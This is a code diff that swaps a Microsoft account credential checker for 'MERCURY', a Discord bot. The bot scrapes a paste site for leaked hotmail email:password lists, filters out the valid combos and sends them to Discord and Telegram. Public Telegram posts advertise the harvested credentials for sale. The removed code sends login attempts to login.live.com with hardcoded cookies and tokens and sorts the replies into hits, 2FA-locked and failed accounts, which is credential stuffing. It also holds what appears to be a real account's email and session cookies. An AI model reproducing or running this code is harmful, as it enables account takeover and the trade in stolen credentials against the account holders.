@@ -1,109 +1,566 @@
-import requests
+"""
+MERCURY — Discord Bot
+Scrapes Pasteview every 30 seconds, posts to 3 Discord channels + Telegram.
+"""
 
-class MailHub:
-    def __init__(self):
-        """
-        Dev --> Not-ISellStuff
-        """
+import asyncio
+import io
+import json
+import logging
+import os
+import random
+import re
+import time
+from datetime import datetime, timezone
+from pathlib import Path
 
-        self.headersMICROSOFT = {"Content-Type": "application/x-www-form-urlencoded","Cookie": "MicrosoftApplicationsTelemetryDeviceId=920e613f-effa-4c29-8f33-9b639c3b321b; MSFPC=GUID=1760ade1dcf744b88cec3dccf0c07f0d&HASH=1760&LV=202311&V=4&LU=1701108908489; mkt=ar-SA; IgnoreCAW=1; MUID=251A1E31369E6D281AED0DE737986C36; MSCC=197.33.70.230-EG; MSPBack=0; NAP=V=1.9&E=1cca&C=sD-vxVi5jYeyeMkwVA7dKII2IAq8pRAa4DmVKHoqD1M-tyafuCSd4w&W=2; ANON=A=D086BC080C843D7172138ECBFFFFFFFF&E=1d24&W=2; SDIDC=CVbyEkUg8GuRPdWN!EPGwsoa25DdTij5DNeTOr4FqnHvLfbt1MrJg5xnnJzsh!HecLu5ZypjM!sZ5TtKN5sdEd2rZ9rugezwzlcUIDU5Szgq7yMLIVdfna8dg3sFCj!kQaXy2pwx6TFwJ7ar63EdVIz*Z3I3yVzEpbDMlVRweAFmG1M54fOyH0tdFaXs5Mk*7WyS05cUa*oiyMjqGmeFcnE7wutZ2INRl6ESPNMi8l98WUFK3*IKKZgUCfuaNm8lWfbBzoWBy9F3hgwe9*QM1yi41O*rE0U0!V4SpmrIPRSGT5yKcYSEDu7TJOO1XXctcPAq21yk*MnNVrYYfibqZvnzRMvTwoNBPBKzrM6*EKQd6RKQyJrKVdEAnErMFjh*JKgS35YauzHTacSRH6ocroAYtB0eXehx5rdp2UyG5kTnd8UqA00JYvp4r1lKkX4Tv9yUb3tZ5vR7JTQLhoQpSblC4zSaT9R5AgxKW3coeXxqkz0Lbpz!7l9qEjO*SdOm*5LBfF2NZSLeXlhol**kM3DFdLVyFogVq0gl0wR52Y02; MSPPre=imrozza%40outlook.com%7c8297dd0d702a14b0%7c%7c; MSPCID=8297dd0d702a14b0; MSPSoftVis=@:@; MSPRequ=id=N&lt=1701944501&co=0; uaid=a7afddfca5ea44a8a2ee1bba76040b3c; OParams=11O.DmVQflQtPeQAtoyExD*hjGXsJOLcnQHVlRoIaEDQfzrgMX2Lpzfa992qCQeIn0O8kdrgRfMm1kEmcXgJqSTERtHj0vlp9lkdMHHCEwZiLEOtxzmks55h!6RupAnHQKeVfVEKbzcTLMei4RMeW1drXQ0BepPQN*WgCK3ua!f6htixcJYNtwumc8f29KYtizlqh0lqQ3a2dZ4Kd!KDOneLTE512ScqObfQd5AGBu*xLbcRbg6xqh1eWCOXW!JOT6defiMqxBGPNL1kQUYgc5WAG8tmjMPFLqVn1*f4xws1NDhwmYOHPu!rS9dn*trC71knxMAfi5Tt69XZHdojgnuopBag*YM7uIBrhUyfxjR*4Zkyygfax9gMaxxG9KScOnPvemNY1ZfVH9Vm!IxQFKoPoKBdLVH5Jc7Eokycow31oq7vNcAbi!cS3Wby0LjzBdr8jq2Aqj3RlWfckJaRoReZ4nY34Gh*eVllAMrF*VQP1iQ7t*I28266q6OQGZ9Y1q53Ai72b!8H5wjQJIJw1XV4zwRO8J02gt6vIPpLBFiq!7IkawEubBPpynkQ3neDo92Tpc71Y*WrnD6H8ojgzxRAj!DIiyfyA7kJHJ7DU!XSg*Xo0L1!DRYSBV!PKwNM7MaBiqsKbRWFnFyzKhBACfiPe8dK5ZUGBSpFbUlpXkUJOb247ewTWAsl9D4G6mezVjGY1u9uOYUPc3ZqTEBFRf4TK94CllbiMRC0v26W*qlwOl0SSpBufo8MtOUqvowUFqEWDDVl9WFV5bT2zZVUy4kPj9a*3YNnskgZghnOCtQYKIIRdFTWgL*DcbQ4XRL8hMisBDjyniS16W2P!1FH0dT12w7RlsJCdotQSK1WppX8sGWNrPrYNcih5ErXVZtYKbqrZLw2EcyGmkp7NxBHFUQXx*1tZSEeiWoZ5BrHSiEB7X2gB7BQDP7RbVYZS5UXeNp3rlGdN*5!nUGK3Fltm1sKFmtZU!T1Q0WaeFwVvpFYSCxg9uw6CC!va2dB*R6NFK!3GNBDrCvbXnJMaKVb!UoBP5G*GASdPnuJgb3cjUE*DIYMJRrPT!dZoHd5BAQSF3vBoPZasphWeflxXFMPBi055OBEawIzxOqS6Wn3IZCp3dgk8QLNssATkzwZvpUM5lSq710QTMZWENDKp5gTIlWcdYpKG1d8TmRlqXRJN7bdUuRIoehIWqnfSuJxGoNk6PM3x3!gMaxPxe1Ch6hMmsagHM8fFQ!MpP0TQ9nsIxh1goCaL*PbHDyj1U3btyu2RXibwIwgV1h5A6DgwmgbaH1Hn9LpdLipiT5fGiRbI903!wYUA3MgQg98OH9BQaJPXte1YpL8iUjUA9MreaZTQ5P13cUiNYrkTW2jVr5PTpEJvwpg*8piWEo9k*IzOCr6iKMRiZwTft*QYEEaKxbyvgLG*s33uhCN46R9J1VwPufzsxyGUHYyE5S1mhx8sWxw!pndIQ!RgVEsDfzvOO0H2P1hBGQG8npJ18th2WKYrvouqHZfRBcEc77hsbXUKec2lv4ETHag0RdrT6kFn03RDX*p*Hac*nugVJK1j0GouxkITbOmMjb8cpau*Lf*xNBUFc3roCuPjEpAcR48X51rIGpOjhAe56Q6CbwIuVe*z*KmRptzngkT4!AB*FGGKh2lOi6b0qR1w4Aia2g1pfjJU2G1r*Q!kSNxYtGn0WOkHiVkhAXQCvkNFp3q!ivZs3obM!0ffg$$; ai_session=6FvJma4ss/5jbM3ZARR4JM|1701943445431|1701944504493; MSPOK=$uuid-d9559e5d-eb3c-4862-aefb-702fdaaf8c62$uuid-d48f3872-ff6f-457e-acde-969d16a38c95$uuid-c227e203-c0b0-411f-9e65-01165bcbc281$uuid-98f882b7-0037-4de4-8f58-c8db795010f1$uuid-0454a175-8868-4a70-9822-8e509836a4ef$uuid-ce4db8a3-c655-4677-a457-c0b7ff81a02f$uuid-160e65e0-7703-4950-9154-67fd0829b36","Origin": "https://login.live.com","Referer": "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=eyJpZCI6IjAzZDZhYmM1NDIzMjQ2Yjg5MWNhYmM2ODg0ZGNmMGMzIn0%3D&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",}
-        self.failMICROSOFT = ["Your account or password is incorrect.", "That Microsoft account doesn\\'t exist. Enter a different account", "Sign in to your Microsoft account", 'Please sign in with a Microsoft account or create a new account']
-        self.retryMICROSOFT = [",AC:null,urlFedConvertRename", "Too Many Requests"]
-        self.nfaMICROSOFT = ["account.live.com/recover?mkt", "recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "Help us protect your account"]
-        self.customMICROSOFT = ["/cancel?mkt=", "/Abuse?mkt="]
-        self.hitsMICROSOFT = ['sSigninName', 'PPAuth', 'WLSSC', 'name="ANON"']
+import aiohttp
 
-    def found(self, keywords, resp):
-        for keyword in keywords:
-            if keyword in resp:
-                return True
-        
+import discord
+from discord.ext import commands, tasks
+from discord import app_commands
+from playwright.async_api import async_playwright
+
+# ─── CONFIG ──────────────────────────────────────────────────────────────────
+DISCORD_TOKEN      = os.environ["DISCORD_TOKEN"]
+CHANNEL_ID         = int(os.environ["CHANNEL_ID"])
+NEW_CHANNEL_ID     = int(os.environ["NEW_CHANNEL_ID"])
+CONTENT_CHANNEL_ID = int(os.environ["CONTENT_CHANNEL_ID"])
+TELEGRAM_TOKEN     = os.environ["TELEGRAM_TOKEN"]
+TELEGRAM_CHAT        = os.environ["TELEGRAM_CHAT"]
+TELEGRAM_PUBLIC_CHAT  = os.environ["TELEGRAM_PUBLIC_CHAT"]
+TELEGRAM_PUBLIC_CHAT2 = os.environ["TELEGRAM_PUBLIC_CHAT2"]
+OWNER_ID           = int(os.environ["OWNER_ID"])
+
+CHECK_INTERVAL   = 30
+PAGES_TO_SCAN    = 5
+ARCHIVE_URL      = "https://pasteview.com/paste-archive"
+SEEN_FILE        = "seen_urls.json"
+EMPTY_SCAN_ALERT = 10
+KEYWORDS         = ["hotmail", "hits", "mixed"]
+BLACKLIST        = ["omegle", "teens", "bro", "sis", "sister", "brother", "incest", "minor", "underage"]
+
+# ─── LOGGING ─────────────────────────────────────────────────────────────────
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(message)s",
+    datefmt="%H:%M:%S",
+)
+log = logging.getLogger("mercury")
+
+# ─── STATE ───────────────────────────────────────────────────────────────────
+start_time = time.time()
+stats      = {"total_pastes": 0, "total_combos": 0, "scans": 0, "empty_scans": 0}
+scan_lock  = asyncio.Lock()
+
+private_post_count = 0  # counts private channel posts, public update every 10
+recent_filenames   = []  # tracks last 10 posted filenames for public update
+
+# ─── FEATURE TOGGLES ─────────────────────────────────────────────────────────
+toggles = {
+    "scanning":        True,   # master on/off for scanning
+    "discord_urls":    True,   # post URL list to channel 1
+    "discord_alerts":  True,   # post new URL alerts to channel 2
+    "discord_content": True,   # post combo file to channel 3
+    "telegram":        True,   # post to private telegram
+    "telegram_public": True,   # post update message to public telegram
+    "owner_dm":        True,   # DM owner on new file
+}
+
+def load_seen() -> set:
+    if Path(SEEN_FILE).exists():
+        try:
+            with open(SEEN_FILE) as f:
+                return set(json.load(f))
+        except Exception:
+            pass
+    return set()
+
+def save_seen(seen: set):
+    try:
+        with open(SEEN_FILE, "w") as f:
+            json.dump(list(seen), f)
+    except Exception as e:
+        log.error(f"Failed to save seen URLs: {e}")
+
+posted_urls: set = load_seen()
+
+# ─── CREDENTIAL VALIDATION ───────────────────────────────────────────────────
+EMOJI_RE = re.compile(
+    "["
+    u"\U0001F600-\U0001F64F"
+    u"\U0001F300-\U0001F5FF"
+    u"\U0001F680-\U0001F9FF"
+    u"\U00002600-\U000027BF"
+    u"\U0001FA00-\U0001FA6F"
+    u"\U0001FA70-\U0001FAFF"
+    u"\U00002702-\U000027B0"
+    "]+", flags=re.UNICODE
+)
+JUNK_DOMAINS   = ("t.me", "telegram.me", "discord.gg", "http://", "https://")
+VALID_EMAIL_RE = re.compile(r"^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$")
+
+def is_valid_combo(line: str) -> bool:
+    if not line or len(line) > 200 or "|" in line:
         return False
+    if EMOJI_RE.search(line) or any(d in line.lower() for d in JUNK_DOMAINS):
+        return False
+    if ":" not in line:
+        return False
+    parts = line.split(":", 1)
+    email, password = parts[0].strip(), parts[1].strip()
+    if not password or len(password) < 3:
+        return False
+    return bool(VALID_EMAIL_RE.match(email))
 
-    # ----------------------------------------------------- #
+def extract_credentials(raw: str) -> list[str]:
+    seen, lines = set(), []
+    for line in raw.splitlines():
+        line = line.strip()
+        if line and is_valid_combo(line) and line not in seen:
+            seen.add(line)
+            lines.append(line)
+    return lines
 
-    def payloadMICROSOFT(self, email, password):
-        payload = {
-            "i13": "0",
-            "login": email,
-            "loginfmt": email,
-            "type": "11",
-            "LoginOptions": "3",
-            "lrt": "",
-            "lrtPartition": "",
-            "hisRegion": "",
-            "hisScaleUnit": "",
-            "passwd": password,
-            "ps": "2",
-            "psRNGCDefaultType": "1",
-            "psRNGCEntropy": "",
-            "psRNGCSLK": "-DiygW3nqox0vvJ7dW44rE5gtFMCs15qempbazLM7SFt8rqzFPYiz07lngjQhCSJAvR432cnbv6uaSwnrXQ*RzFyhsGXlLUErzLrdZpblzzJQawycvgHoIN2D6CUMD9qwoIgR*vIcvH3ARmKp1m44JQ6VmC6jLndxQadyaLe8Tb!ZLz59Te6lw6PshEEM54ry8FL2VM6aH5HPUv94uacHz!qunRagNYaNJax7vItu5KjQ",
-            "canary": "",
-            "ctx": "",
-            "hpgrequestid": "",
-            "PPFT": "-DjzN1eKq4VUaibJxOt7gxnW7oAY0R7jEm4DZ2KO3NyQh!VlvUxESE5N3*8O*fHxztUSA7UxqAc*jZ*hb9kvQ2F!iENLKBr0YC3T7a5RxFF7xUXJ7SyhDPND0W3rT1l7jl3pbUIO5v1LpacgUeHVyIRaVxaGUg*bQJSGeVs10gpBZx3SPwGatPXcPCofS!R7P0Q$$",
-            "PPSX": "Passp",
-            "NewUser": "1",
-            "FoundMSAs": "",
-            "fspost": "0",
-            "i21": "0",
-            "CookieDisclosure": "0",
-            "IsFidoSupported": "1",
-            "isSignupPost": "0",
-            "isRecoveryAttemptPost": "0",
-            "i19": "21648"
-        }
 
-        return payload
+# ─── TELEGRAM ────────────────────────────────────────────────────────────────
+async def send_telegram_file(text, filename: str):
+    url  = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
+    data = aiohttp.FormData()
+    data.add_field("chat_id", TELEGRAM_CHAT)
+    content = text.encode() if isinstance(text, str) else text
+    data.add_field("document", content, filename=filename, content_type="application/octet-stream")
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.post(url, data=data) as resp:
+                if resp.status != 200:
+                    body = await resp.text()
+                    log.error(f"Telegram API error {resp.status}: {body}")
+                else:
+                    log.info("Posted to Telegram")
+    except Exception as e:
+        log.error(f"Failed to send to Telegram: {e}")
 
-    def loginMICROSOFT(self, email, password, proxy):
-        session = requests.sessions.session()
+# ─── BOT ─────────────────────────────────────────────────────────────────────
+intents = discord.Intents.default()
+bot  = commands.Bot(command_prefix="!", intents=intents)
+tree = bot.tree
 
-        if proxy == None:
+async def post_pastes(channel, pastes: list[dict]):
+    if not pastes:
+        return
+    try:
+        content  = "\n".join(item["url"] for item in pastes)
+        filename = f"hotmail_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.txt"
+        await channel.send(file=discord.File(fp=io.BytesIO(content.encode()), filename=filename))
+    except Exception as e:
+        log.error(f"Failed to post file: {e}")
+
+async def post_new_alerts(channel, pastes: list[dict]):
+    for item in pastes:
+        try:
+            await channel.send(f"= DETECTED 1 NEW URL =\n{item['url']}")
+            await asyncio.sleep(0.5)
+        except Exception as e:
+            log.error(f"Failed to post alert: {e}")
+
+async def extract_raw(page, url: str) -> str:
+    for attempt in range(2):
+        try:
+            await page.goto(url, wait_until="networkidle", timeout=15000)
+            await page.wait_for_timeout(1500)
+
+            raw = await page.evaluate("""
+                () => {
+                    if (window.ace) {
+                        const editors = document.querySelectorAll('.ace_editor');
+                        for (let ed of editors) {
+                            try { const v = ace.edit(ed).getValue(); if (v && v.trim()) return v; } catch(e) {}
+                        }
+                    }
+                    return null;
+                }
+            """)
+
+            if not raw or not raw.strip():
+                await page.evaluate("() => { const s = document.querySelector('.ace_scroller'); if (s) s.scrollTop = s.scrollHeight; }")
+                await page.wait_for_timeout(800)
+                lines = await page.query_selector_all("div.ace_line")
+                raw   = "\n".join([(await l.text_content() or "").strip() for l in lines])
+
+            if not raw or not raw.strip():
+                pre = await page.query_selector("pre")
+                if pre:
+                    raw = await pre.text_content()
+
+            if raw and raw.strip():
+                return raw
+
+        except Exception as e:
+            log.error(f"Extract attempt {attempt+1} failed for {url}: {e}")
+            if attempt == 0:
+                await asyncio.sleep(2)
+
+    return ""
+
+# ─── BACKGROUND TASK ─────────────────────────────────────────────────────────
+@tasks.loop(seconds=CHECK_INTERVAL)
+async def monitor_loop():
+    try:
+        channel = bot.get_channel(CHANNEL_ID) or await bot.fetch_channel(CHANNEL_ID)
+    except Exception as e:
+        log.error(f"Could not get channel: {e}")
+        return
+
+    if not toggles["scanning"]:
+        return
+
+    if scan_lock.locked():
+        log.info("Scan already in progress, skipping this cycle")
+        return
+
+    async with scan_lock:
+        stats["scans"] += 1
+        log.info(f"Running scan #{stats['scans']}...")
+
+        async with async_playwright() as p:
+            browser = await p.chromium.launch(
+                headless=True,
+                args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
+            )
+            page = await browser.new_page()
+
             try:
-                r = session.post("https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216", headers=self.headersMICROSOFT, data=self.payloadMICROSOFT(email, password), timeout=100)
+                # ── Step 1: load archive ───────────────────────────────────
+                for attempt in range(3):
+                    try:
+                        await page.goto(ARCHIVE_URL, wait_until="networkidle", timeout=30000)
+                        await page.wait_for_timeout(2000)
+                        break
+                    except Exception as e:
+                        log.warning(f"Archive load attempt {attempt+1} failed: {e}")
+                        if attempt == 2:
+                            log.error("Archive failed after 3 attempts, skipping scan")
+                            return
+                        await asyncio.sleep(3)
 
-                if self.found(self.hitsMICROSOFT, r.text):
-                    return ["ok", r.cookies.get("X-OWA-CANARY")]
+                # ── Step 2: scrape pages ───────────────────────────────────
+                found = []
+                for page_num in range(1, PAGES_TO_SCAN + 1):
+                    if page_num > 1:
+                        navigated = False
+                        buttons   = await page.query_selector_all("button")
+                        for btn in buttons:
+                            text = await btn.text_content()
+                            if text and text.strip().lower() in ["next", ">", "»", "→", "▶"]:
+                                disabled  = await btn.get_attribute("disabled")
+                                aria_dis  = await btn.get_attribute("aria-disabled")
+                                if disabled is not None or aria_dis == "true":
+                                    break
+                                await btn.click()
+                                await page.wait_for_timeout(2000)
+                                navigated = True
+                                break
+                        if not navigated:
+                            break
 
-                if self.found(self.nfaMICROSOFT, r.text):
-                    return ["nfa"]
-            
-                if self.found(self.customMICROSOFT, r.text):
-                    return ["custom"]
-                
-                if self.found(self.failMICROSOFT, r.text):
-                    return ["fail"]
+                    matches = await page.evaluate("""
+                        (keywords) => {
+                            const results = [];
+                            for (const a of document.querySelectorAll('a')) {
+                                const text = (a.innerText || a.textContent || '').toLowerCase();
+                                if (keywords.some(k => text.includes(k))) {
+                                    const href = a.href;
+                                    if (href
+                                        && !href.includes('/paste-archive')
+                                        && !href.includes('/new')
+                                        && !href.endsWith('/')
+                                        && href !== window.location.href) {
+                                        results.push({
+                                            title: (a.innerText || a.textContent || '').trim().replace(/\\s+/g, ' '),
+                                            url: href
+                                        });
+                                    }
+                                }
+                            }
+                            return results;
+                        }
+                    """, KEYWORDS)
+                    log.info(f"Page {page_num}: {len(matches)} match(es)")
+                    found.extend(matches)
 
-                if self.found(self.retryMICROSOFT, r.text):
-                    return ["retry"]
-                
-                return ["ok", r.cookies.get("X-OWA-CANARY")]
+                # Deduplicate and filter blacklisted titles
+                seen_this_run = set()
+                pastes        = []
+                for item in found:
+                    if item["url"] in seen_this_run:
+                        continue
+                    if any(b in item["title"].lower() for b in BLACKLIST):
+                        log.info(f"Skipping blacklisted paste: {item['title']}")
+                        continue
+                    seen_this_run.add(item["url"])
+                    pastes.append(item)
 
-            except:
-                return ["retry"]
-        else:
-            try:
-                r = session.post("https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216", headers=self.headersMICROSOFT, data=self.payloadMICROSOFT(email, password), timeout=200, proxies=proxy)
+                stats["total_pastes"] += len(pastes)
 
-                if self.found(self.hitsMICROSOFT, r.text):
-                    return ["ok", r.cookies.get("X-OWA-CANARY")]
+                # ── Step 3: post all URLs to channel 1 ────────────────────
+                await post_pastes(channel, pastes)
 
-                if self.found(self.nfaMICROSOFT, r.text):
-                    return ["nfa"]
-            
-                if self.found(self.customMICROSOFT, r.text):
-                    return ["custom"]
-                
-                if self.found(self.failMICROSOFT, r.text):
-                    return ["fail"]
+                # ── Step 4: filter new pastes & mark seen ─────────────────
+                new_pastes = [p for p in pastes if p["url"] not in posted_urls]
+                if not new_pastes:
+                    stats["empty_scans"] += 1
+                    log.info(f"No new pastes (empty streak: {stats['empty_scans']})")
+                    if stats["empty_scans"] == EMPTY_SCAN_ALERT:
+                        try:
+                            owner = await bot.fetch_user(OWNER_ID)
+                            await owner.send(f"⚠️ MERCURY: No new pastes in {EMPTY_SCAN_ALERT} consecutive scans.")
+                        except Exception as e:
+                            log.error(f"Failed to DM owner: {e}")
+                    return
 
-                if self.found(self.retryMICROSOFT, r.text):
-                    return ["retry"]
-                
-                return ["ok", r.cookies.get("X-OWA-CANARY")]
+                stats["empty_scans"] = 0
+                for p in new_pastes:
+                    posted_urls.add(p["url"])
+                save_seen(posted_urls)
+                log.info(f"{len(new_pastes)} new paste(s) detected")
 
-            except:
-                return ["retry"]
-            
-    # ----------------------------------------------------- #
+                # ── Step 5: new URL alerts to channel 2 ───────────────────
+                if toggles["discord_alerts"]:
+                    try:
+                        new_channel = bot.get_channel(NEW_CHANNEL_ID) or await bot.fetch_channel(NEW_CHANNEL_ID)
+                        await post_new_alerts(new_channel, new_pastes)
+                    except Exception as e:
+                        log.error(f"Could not post to new channel: {e}")
+
+                # ── Step 6: extract creds & post to channel 3 ─────────────
+                try:
+                    content_channel = bot.get_channel(CONTENT_CHANNEL_ID) or await bot.fetch_channel(CONTENT_CHANNEL_ID)
+                    combined        = []
+
+                    for item in new_pastes[:5]:
+                        url = item["url"]
+                        log.info(f"Extracting from {url}")
+                        raw = await extract_raw(page, url)
+                        if raw:
+                            creds = extract_credentials(raw)
+                            if creds:
+                                combined.append("\n".join(creds))
+                                stats["total_combos"] += len(creds)
+                                log.info(f"✓ {len(creds)} valid combos from {url}")
+                            else:
+                                log.info(f"No valid combos in {url}")
+                        else:
+                            log.info(f"No content extracted from {url}")
+
+
+                    if combined:
+                        # Flatten all creds
+                        all_raw = [l for b in combined for l in b.splitlines() if l.strip()]
+
+                        # Determine label
+                        title_lower_check = " ".join(p["title"].lower() for p in new_pastes)
+                        if "hotmail" in title_lower_check:
+                            label = "hotmail"
+                        elif "hits" in title_lower_check:
+                            label = "hits"
+                        elif "mix" in title_lower_check or "mixed" in title_lower_check:
+                            label = "mix"
+                        else:
+                            label = "content"
+
+                        valid_hits = all_raw
+                        combined = ["\n".join(valid_hits)]
+
+                    if combined:
+                        output   = "\n\n".join(combined)
+                        filename = f"{len(valid_hits)} {label.upper()}.txt"
+
+                        # Discord — post full file + ZIP (if not mix)
+                        if toggles["discord_content"]:
+                            try:
+                                await content_channel.send(file=discord.File(fp=io.BytesIO(output.encode()), filename=filename))
+                                log.info(f"Posted main file to Discord: {filename}")
+                            except Exception as e:
+                                log.error(f"Failed to post main file to Discord: {e}")
+
+
+                        # DM owner
+                        if toggles["owner_dm"]:
+                            try:
+                                owner = await bot.fetch_user(OWNER_ID)
+                                total = sum(len(b.splitlines()) for b in combined)
+                                await owner.send(f"✅ New {label.upper()} detected — {total} combos")
+                            except Exception as e:
+                                log.error(f"Failed to DM owner: {e}")
+
+                        # Telegram
+                        if toggles["telegram"]:
+                            all_creds = [l for b in combined for l in b.splitlines() if l.strip()]
+                            random.shuffle(all_creds)
+                            tg_header = (
+                                f"WAR CLOUD PRIVATE {label.upper()}\n"
+                                "------------------------\n"
+                                "https://t.me/+5Bqqamk3cpcxNDA0\n"
+                                "https://t.me/+5Bqqamk3cpcxNDA0\n"
+                                "https://t.me/+5Bqqamk3cpcxNDA0\n\n"
+                            )
+                            await send_telegram_file(tg_header + "\n".join(all_creds), filename)
+
+
+                            if toggles["telegram_public"]:
+                                private_post_count_ref = globals()
+                                private_post_count_ref["private_post_count"] += 1
+                                private_post_count_ref["recent_filenames"].append(filename)
+                                log.info(f"Private post count: {private_post_count_ref['private_post_count']}")
+                                if private_post_count_ref["private_post_count"] >= 2:
+                                    private_post_count_ref["private_post_count"] = 0
+                                    file_list = "\n".join(f"  • {fn}" for fn in private_post_count_ref["recent_filenames"])
+                                    private_post_count_ref["recent_filenames"] = []
+                                    pub_text = f"PRIVATE CLOUD UPDATED !\n\nFiles added:\n{file_list}\n\n-DM @XN9BOWNER TO BUY\n-WAR VOUCHES: @warvouchess"
+                                    promo_path = os.path.join("/app", "promo.png")
+                                    async with aiohttp.ClientSession() as sess:
+                                        for pub_chat in [TELEGRAM_PUBLIC_CHAT, TELEGRAM_PUBLIC_CHAT2]:
+                                            try:
+                                                if os.path.exists(promo_path):
+                                                    form = aiohttp.FormData()
+                                                    form.add_field("chat_id", pub_chat)
+                                                    form.add_field("caption", pub_text)
+                                                    with open(promo_path, "rb") as img:
+                                                        form.add_field("photo", img.read(), filename="promo.png", content_type="image/png")
+                                                    resp = await sess.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto", data=form)
+                                                    body = await resp.json()
+                                                    if not body.get("ok"):
+                                                        log.error(f"Telegram sendPhoto failed: {body}")
+                                                    else:
+                                                        log.info(f"Posted public update with image to {pub_chat}")
+                                                else:
+                                                    log.warning(f"promo.png not found at {promo_path}, sending text only")
+                                                    resp = await sess.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                                                        json={"chat_id": pub_chat, "text": pub_text})
+                                                    body = await resp.json()
+                                                    if not body.get("ok"):
+                                                        log.error(f"Telegram sendMessage failed: {body}")
+                                                    else:
+                                                        log.info(f"Posted public update to {pub_chat}")
+                                            except Exception as e:
+                                                log.error(f"Failed to post public update to {pub_chat}: {e}")
+
+
+                    else:
+                        log.info("Nothing to post to content channel")
+
+                except Exception as e:
+                    log.error(f"Could not post to content channel: {e}")
+
+            except Exception as e:
+                log.error(f"Monitor loop error: {e}")
+                stats["empty_scans"] += 1
+            finally:
+                await browser.close()
+
+
+@monitor_loop.before_loop
+async def before_monitor():
+    await bot.wait_until_ready()
+
+
+@tasks.loop(seconds=60)
+async def watchdog():
+    """Restart monitor loop if it dies."""
+    if not monitor_loop.is_running():
+        log.warning("Monitor loop was dead, restarting...")
+        monitor_loop.start()
+
+
+@watchdog.before_loop
+async def before_watchdog():
+    await bot.wait_until_ready()
+
+# ─── SLASH COMMANDS ───────────────────────────────────────────────────────────
+@tree.command(name="scrape", description="Manually trigger a scrape right now")
+@app_commands.describe(pages="Number of archive pages to scan (default: 5)")
+async def cmd_scrape(interaction: discord.Interaction, pages: int = PAGES_TO_SCAN):
+    await interaction.response.send_message(f"🔴 Scanning {pages} page(s)...", ephemeral=True)
+    await monitor_loop()
+    await interaction.followup.send("✅ Done.", ephemeral=True)
+
+
+@tree.command(name="toggle", description="Enable or disable a bot feature")
+@app_commands.describe(feature="Feature to toggle")
+@app_commands.choices(feature=[
+    app_commands.Choice(name="scanning",        value="scanning"),
+    app_commands.Choice(name="discord_urls",    value="discord_urls"),
+    app_commands.Choice(name="discord_alerts",  value="discord_alerts"),
+    app_commands.Choice(name="discord_content", value="discord_content"),
+    app_commands.Choice(name="telegram",        value="telegram"),
+    app_commands.Choice(name="telegram_public", value="telegram_public"),
+    app_commands.Choice(name="owner_dm",        value="owner_dm"),
+])
+async def cmd_toggle(interaction: discord.Interaction, feature: str):
+    if interaction.user.id != OWNER_ID:
+        await interaction.response.send_message("❌ Only the owner can use this.", ephemeral=True)
+        return
+    toggles[feature] = not toggles[feature]
+    state = "✅ ON" if toggles[feature] else "❌ OFF"
+    await interaction.response.send_message(f"`{feature}` is now {state}", ephemeral=True)
+
+
+@tree.command(name="toggles", description="Show current status of all toggles")
+async def cmd_toggles(interaction: discord.Interaction):
+    lines = [f"{'✅' if v else '❌'} `{k}`" for k, v in toggles.items()]
+    await interaction.response.send_message("\n".join(lines), ephemeral=True)
+
+
+
+@tree.command(name="stats", description="Show bot stats")
+async def cmd_stats(interaction: discord.Interaction):
+    uptime_secs      = int(time.time() - start_time)
+    hours, remainder = divmod(uptime_secs, 3600)
+    minutes, seconds = divmod(remainder, 60)
+    embed = discord.Embed(title="MERCURY // STATS", color=0xCC0000, timestamp=datetime.now(timezone.utc))
+    embed.add_field(name="Uptime",       value=f"{hours}h {minutes}m {seconds}s", inline=True)
+    embed.add_field(name="Scans Run",    value=str(stats["scans"]),               inline=True)
+    embed.add_field(name="Pastes Found", value=str(stats["total_pastes"]),        inline=True)
+    embed.add_field(name="Combos Found", value=str(stats["total_combos"]),        inline=True)
+    embed.add_field(name="URLs Tracked", value=str(len(posted_urls)),             inline=True)
+    embed.add_field(name="Check Every",  value=f"{CHECK_INTERVAL}s",             inline=True)
+    await interaction.response.send_message(embed=embed)
+
+# ─── EVENTS ──────────────────────────────────────────────────────────────────
+@bot.event
+async def on_ready():
+    log.info(f"Logged in as {bot.user} (ID: {bot.user.id})")
+    try:
+        synced = await tree.sync()
+        log.info(f"Synced {len(synced)} slash command(s)")
+    except Exception as e:
+        log.error(f"Failed to sync commands: {e}")
+
+    # Delete Telegram webhook so it doesnt process channel messages
+    try:
+        async with aiohttp.ClientSession() as sess:
+            await sess.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/deleteWebhook?drop_pending_updates=true")
+            log.info("Telegram webhook cleared")
+    except Exception as e:
+        log.error(f"Failed to clear Telegram webhook: {e}")
+    if not monitor_loop.is_running():
+        monitor_loop.start()
+        log.info(f"Monitor started — checking every {CHECK_INTERVAL}s")
+    else:
+        log.info("Monitor already running after reconnect")
+    if not watchdog.is_running():
+        watchdog.start()
+
+@bot.event
+async def on_resumed():
+    log.info("Discord session resumed")
+    if not monitor_loop.is_running():
+        monitor_loop.start()
+        log.info("Monitor restarted after resume")
+    if not watchdog.is_running():
+        watchdog.start()
+
+# ─── RUN ─────────────────────────────────────────────────────────────────────
+if __name__ == "__main__":
+    bot.run(DISCORD_TOKEN, log_handler=None)
